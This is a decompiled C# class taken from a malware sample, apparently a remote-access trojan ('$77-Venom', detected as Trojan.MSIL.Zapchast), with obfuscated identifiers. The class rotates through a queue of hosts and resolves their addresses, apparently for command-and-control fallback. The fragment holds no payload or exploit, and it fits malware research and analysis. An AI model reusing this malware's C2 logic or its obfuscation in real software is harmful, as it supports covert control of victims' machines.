// Decompiled with JetBrains decompiler
// Type: ઝ忧㷫￉挰螀ℬ䀖��鑁眔ꤛⰸ⨈稏ᇙ䌅
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

public class ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅
{
  private readonly Queue<ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜> 砍茪큖\u2544\u2858ᖌ凎\uA4CF挝\uFFFD첦무헦蛦愢匇َ챖\u2777櫌 = new Queue<ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜>();

  public bool IsEmpty => this.砍茪큖\u2544\u2858ᖌ凎\uA4CF挝\uFFFD첦무헦蛦愢匇َ챖\u2777櫌.Count == 0;

  public ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅(
    List<ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜> hosts)
  {
    foreach (ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜 host in hosts)
      this.砍茪큖\u2544\u2858ᖌ凎\uA4CF挝\uFFFD첦무헦蛦愢匇َ챖\u2777櫌.Enqueue(host);
  }

  public ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜 ჭ聪덤嬿ￎ\uF7D3㘻螹幀〤粿\uEDE5Ꮯ䒙\u9FEF臎㿒ᵠ\uF73D犑()
  {
    ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜 host = this.砍茪큖\u2544\u2858ᖌ凎\uA4CF挝\uFFFD첦무헦蛦愢匇َ챖\u2777櫌.Dequeue();
    this.砍茪큖\u2544\u2858ᖌ凎\uA4CF挝\uFFFD첦무헦蛦愢匇َ챖\u2777櫌.Enqueue(host);
    host.IpAddress = ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅.銁㐗\uFFFD鄐⳱挕Ɇ䠶\u214B\uFFFD荜ꜹ\uFFFD叺鍧\u2838碰洹熎裎(host);
    return host;
  }

  private static IPAddress 銁㐗\uFFFD鄐⳱挕Ɇ䠶\u214B\uFFFD荜ꜹ\uFFFD叺鍧\u2838碰洹熎裎(
    ᴃ䵶헩堐\uFDED薳爊\u008D辍\u1CB6\uA6F6䆆ţ콋᷎㓶ퟛ\uFFFD䨶㥜 host)
  {
    if (string.IsNullOrEmpty(host.Hostname))
      return (IPAddress) null;
    IPAddress address;
    if (IPAddress.TryParse(host.Hostname, out address))
      return address.AddressFamily == AddressFamily.InterNetworkV6 && !Socket.OSSupportsIPv6 ? (IPAddress) null : address;
    IPAddress[] addressList = Dns.GetHostEntry(host.Hostname).AddressList;
    foreach (IPAddress ipAddress in addressList)
    {
      switch (ipAddress.AddressFamily)
      {
        case AddressFamily.InterNetwork:
          return ipAddress;
        case AddressFamily.InterNetworkV6:
          if (addressList.Length == 1)
            return ipAddress;
          break;
      }
    }
    return address;
  }
}
